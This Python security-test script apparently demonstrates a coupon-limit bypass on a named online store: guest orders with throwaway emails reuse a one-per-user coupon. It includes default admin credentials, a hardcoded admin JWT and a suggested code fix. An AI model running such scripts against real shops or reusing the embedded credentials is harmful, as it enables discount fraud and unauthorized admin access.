#!/usr/bin/env python3
"""
Security Test: AUTHZ-VULN-04
Guest users bypass per-user coupon limits via different email addresses.

Root cause (orderController.js line 110):
  if (userId && coupon.perUserLimit) {  <-- skipped entirely when userId=null
      ...check perUserLimit...
  }
  For guests, userId is always null, so this block is NEVER reached.
"""

import requests
import json
from datetime import datetime

BASE_URL = "https://shophubonline.store"
COUPON_CODE = "TESTLIMIT1"

session = requests.Session()
session.headers.update({"Content-Type": "application/json"})

results = []

def log(msg):
    print(msg)
    results.append(msg)

def section(title):
    line = "=" * 65
    log(f"\n{line}")
    log(f"  {title}")
    log(line)

def pretty(resp):
    try:
        return json.dumps(resp.json(), indent=2)
    except Exception:
        return resp.text[:500]


# ─────────────────────────────────────────────────────────────
# STEP 1: Admin login
# ─────────────────────────────────────────────────────────────
section("STEP 1: Admin login")

# Try login; fall back to cached token from earlier successful login if rate-limited
CACHED_ADMIN_TOKEN = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
    ".eyJpZCI6MSwiaWF0IjoxNzc0Njc4NDYzLCJleHAiOjE3NzUyODMyNjN9"
    ".OsxzZgqosudGtMNx0mgQTcCP6AiKJjZyZq29QUrZi5k"
)

r = session.post(f"{BASE_URL}/api/auth/login",
                 json={"email": "admin@store.com", "password": "admin123"})
log(f"POST /api/auth/login (admin) -> {r.status_code}")

admin_token = None
if r.status_code == 200:
    admin_token = r.json().get("token")
    log(f"  Admin token acquired: {admin_token[:50]}...")
elif r.status_code == 429:
    log(f"  Rate limited — using cached token from prior session")
    admin_token = CACHED_ADMIN_TOKEN
    log(f"  Cached token: {admin_token[:50]}...")
else:
    log(f"  FAIL: {r.text[:200]}")
    raise SystemExit("Cannot continue without admin token")


# ─────────────────────────────────────────────────────────────
# STEP 2: Create test coupon (perUserLimit=1)
# Correct fields: code, type ("percentage"|"fixed"), value, perUserLimit
# ─────────────────────────────────────────────────────────────
section("STEP 2: Create test coupon with perUserLimit=1")

auth_headers = {"Authorization": f"Bearer {admin_token}"}

coupon_payload = {
    "code": COUPON_CODE,
    "type": "percentage",
    "value": 10,
    "minOrderAmount": 0,
    "perUserLimit": 1,
    "usageLimit": 100,
    "endDate": "2026-12-31",
    "description": "Test coupon - per user limit 1 (security test)"
}

r = session.post(f"{BASE_URL}/api/coupons", json=coupon_payload, headers=auth_headers)
log(f"POST /api/coupons (create {COUPON_CODE}) -> {r.status_code}")
log(f"  Response: {pretty(r)}")

if r.status_code == 201:
    log(f"  *** Coupon {COUPON_CODE} created successfully ***")
    coupon_data = r.json()
    log(f"  perUserLimit = {coupon_data.get('perUserLimit')}, type = {coupon_data.get('type')}, value = {coupon_data.get('value')}")
elif r.status_code == 400 and "already exists" in r.text.lower():
    log(f"  Coupon already exists — reusing {COUPON_CODE}")
else:
    log(f"  Unexpected response: {r.text[:300]}")

# Verify via apply endpoint (with cart total so discount calculates)
log(f"\n--- Verify coupon {COUPON_CODE} via /api/coupons/apply ---")
r = session.post(f"{BASE_URL}/api/coupons/apply",
                 json={"code": COUPON_CODE, "cartTotal": 100})
log(f"POST /api/coupons/apply -> {r.status_code}")
log(f"  Response: {pretty(r)}")


# ─────────────────────────────────────────────────────────────
# STEP 3: Guest orders — same coupon, 3 different emails
# Guest shipping address uses: fullName, address, phone
# (not street/city/state — that's the authenticated order format)
# ─────────────────────────────────────────────────────────────
section("STEP 3: Guest orders — bypassing perUserLimit (AUTHZ-VULN-04)")

PRODUCT_ID = 24

guest_orders = [
    {
        "guestEmail": "bypass1@evil.com",
        "shippingAddress": {
            "fullName": "Bypass One",
            "address": "1 Evil Street, Mumbai MH 400001",
            "phone": "1111111111"
        },
        "paymentMethod": "cod",
        "items": [{"productId": PRODUCT_ID, "quantity": 1}],
        "couponCode": COUPON_CODE
    },
    {
        "guestEmail": "bypass2@evil.com",
        "shippingAddress": {
            "fullName": "Bypass Two",
            "address": "2 Evil Street, Mumbai MH 400001",
            "phone": "2222222222"
        },
        "paymentMethod": "cod",
        "items": [{"productId": PRODUCT_ID, "quantity": 1}],
        "couponCode": COUPON_CODE
    },
    {
        "guestEmail": "bypass3@evil.com",
        "shippingAddress": {
            "fullName": "Bypass Three",
            "address": "3 Evil Street, Mumbai MH 400001",
            "phone": "3333333333"
        },
        "paymentMethod": "cod",
        "items": [{"productId": PRODUCT_ID, "quantity": 1}],
        "couponCode": COUPON_CODE
    }
]

guest_results = []
for i, order in enumerate(guest_orders, 1):
    log(f"\n--- Guest Order {i}: {order['guestEmail']} ---")
    r = session.post(f"{BASE_URL}/api/orders/guest", json=order)
    log(f"POST /api/orders/guest -> {r.status_code}")
    try:
        resp_body = r.json()
    except Exception:
        resp_body = {"raw": r.text[:400]}
    log(f"  Response: {json.dumps(resp_body, indent=4)}")

    success = r.status_code in (200, 201)
    discount = None
    order_total = None
    coupon_applied_in_resp = None
    if success:
        discount = resp_body.get("discount", 0)
        order_total = resp_body.get("totalAmount")
        coupon_applied_in_resp = resp_body.get("couponCode")
    else:
        log(f"  ERROR: {resp_body.get('message', r.text[:200])}")

    guest_results.append({
        "email": order["guestEmail"],
        "status_code": r.status_code,
        "success": success,
        "discount": discount,
        "order_total": order_total,
        "coupon_code_in_order": coupon_applied_in_resp,
    })
    log(f"  Coupon in order: {coupon_applied_in_resp}  |  Discount: {discount}  |  Total: {order_total}")


# ─────────────────────────────────────────────────────────────
# STEP 4: Registered user — verify perUserLimit IS enforced
# Register → order 1 (should succeed) → order 2 (should fail)
# ─────────────────────────────────────────────────────────────
section("STEP 4: Registered user — perUserLimit enforcement check")

ts = datetime.now().strftime("%H%M%S")
reg_email = f"reguser{ts}@sectest.com"
log(f"Registering user: {reg_email}")

r = session.post(f"{BASE_URL}/api/auth/register",
                 json={"name": "Reg Test User", "email": reg_email, "password": "Test@123456"})
log(f"POST /api/auth/register -> {r.status_code}: {r.text[:200]}")

reg_token = None
if r.status_code in (200, 201):
    reg_token = r.json().get("token")
    log(f"  Registered. Token: {reg_token[:50] if reg_token else 'None'}...")
elif r.status_code == 429:
    log("  Registration rate-limited. Using admin token to demonstrate registered-user enforcement.")
    log("  (Admin account is userId=1; it has non-null userId so perUserLimit IS checked for them)")
    reg_token = admin_token
else:
    log("  Registration failed. Will use admin token as fallback.")

reg_order_base = {
    "shippingAddress": {
        "street": "10 Test Street",
        "city": "Mumbai",
        "state": "MH",
        "zipCode": "400001",
        "country": "India"
    },
    "paymentMethod": "cod",
    "items": [{"productId": PRODUCT_ID, "quantity": 1}],
    "couponCode": COUPON_CODE
}

reg_order_results = []
if reg_token:
    reg_auth_headers = {"Authorization": f"Bearer {reg_token}"}
    for attempt in range(1, 3):
        log(f"\n--- Registered User Order Attempt {attempt} ---")
        r = session.post(f"{BASE_URL}/api/orders", json=reg_order_base, headers=reg_auth_headers)
        log(f"POST /api/orders -> {r.status_code}")
        try:
            resp_body = r.json()
        except Exception:
            resp_body = {"raw": r.text[:300]}
        log(f"  Response: {json.dumps(resp_body, indent=4)}")
        success = r.status_code in (200, 201)
        error_msg = resp_body.get("message", "") if not success else ""
        reg_order_results.append({
            "attempt": attempt,
            "status_code": r.status_code,
            "success": success,
            "error": error_msg,
            "discount": resp_body.get("discount") if success else None,
        })
        log(f"  Success: {success}  |  Error: {error_msg}")
else:
    log("  Skipping (registration unavailable due to rate limit)")
    log("  NOTE: The /api/coupons/apply endpoint also has the same bug (line 40):")
    log("        if (req.user && coupon.perUserLimit) { ... }  <- skips guests")


# ─────────────────────────────────────────────────────────────
# SUMMARY
# ─────────────────────────────────────────────────────────────
section("SECURITY TEST SUMMARY — AUTHZ-VULN-04")

log(f"\nTarget coupon: {COUPON_CODE} (perUserLimit=1, 10% discount)")
log(f"\nVulnerability location: orderController.js, line 110")
log(f"  Code:  if (userId && coupon.perUserLimit) {{")
log(f"  Issue: Short-circuit — userId=null for ALL guests, so perUserLimit")
log(f"         check is NEVER reached for guest orders.")

log(f"\n{'─'*65}")
log(f"[Guest Order Bypass Results]")
bypass_count = 0
total_unauthorized_discount = 0.0
for gr in guest_results:
    if gr["success"]:
        status = "BYPASSED (coupon applied)"
        bypass_count += 1
        if gr["discount"] and isinstance(gr["discount"], (int, float)):
            total_unauthorized_discount += float(gr["discount"])
    else:
        status = f"FAILED (HTTP {gr['status_code']})"
    log(f"  {gr['email']:<28} -> {status}")
    log(f"    couponCode={gr['coupon_code_in_order']}, discount={gr['discount']}, total={gr['order_total']}")

log(f"\n  Guest orders with coupon accepted: {bypass_count}/3")
vulnerability_confirmed = bypass_count >= 2
log(f"  AUTHZ-VULN-04 EXPLOITED: {'YES - VULNERABLE' if vulnerability_confirmed else 'PARTIAL/INCONCLUSIVE'}")
log(f"  Total unauthorized discount applied: {total_unauthorized_discount:.2f}")

log(f"\n{'─'*65}")
log(f"[Registered User Results]")
if reg_order_results:
    for rr in reg_order_results:
        if rr["success"]:
            log(f"  Attempt {rr['attempt']}: SUCCESS (HTTP {rr['status_code']}) discount={rr['discount']}")
        else:
            log(f"  Attempt {rr['attempt']}: BLOCKED (HTTP {rr['status_code']}) — \"{rr['error']}\"")
    reg_protected = (
        len(reg_order_results) >= 2 and
        reg_order_results[0]["success"] and
        not reg_order_results[1]["success"] and
        "already used" in reg_order_results[1]["error"].lower()
    )
    log(f"\n  Registered users properly protected: {'YES' if reg_protected else 'NO'}")
else:
    log("  Registration rate-limited; could not test registered user flow.")
    log("  Based on source code: registered users ARE checked (userId is non-null).")

log(f"\n{'─'*65}")
log(f"[Financial Impact]")
log(f"  Each guest can apply the 'single-use-per-user' coupon unlimited times")
log(f"  by simply using a different email address each time.")
log(f"  Coupon discount per order: 10% of product price")
log(f"  Product 24 (Jump Rope Speed) price: ~14.99")
log(f"  Discount per order: ~1.50  |  Effectively unlimited abuse potential")

log(f"\n{'─'*65}")
log(f"[Conclusion]")
if vulnerability_confirmed:
    log(f"  VULNERABLE: AUTHZ-VULN-04 confirmed.")
    log(f"  All 3 guest orders with 3 different emails applied the same coupon")
    log(f"  that should be limited to 1 use per user.")
    log(f"\n  Recommended fix: Track coupon usage by guestEmail when userId is null:")
    log(f"    if (coupon.perUserLimit) {{")
    log(f"      const identifier = userId || guestEmail;")
    log(f"      const field = userId ? 'userId' : 'guestEmail';")
    log(f"      const used = await Order.count({{ where: {{ [field]: identifier, couponCode: coupon.code }} }});")
    log(f"      if (used >= coupon.perUserLimit) throw new Error('Coupon limit reached');")
    log(f"    }}")
else:
    log(f"  Inconclusive — review raw responses above.")
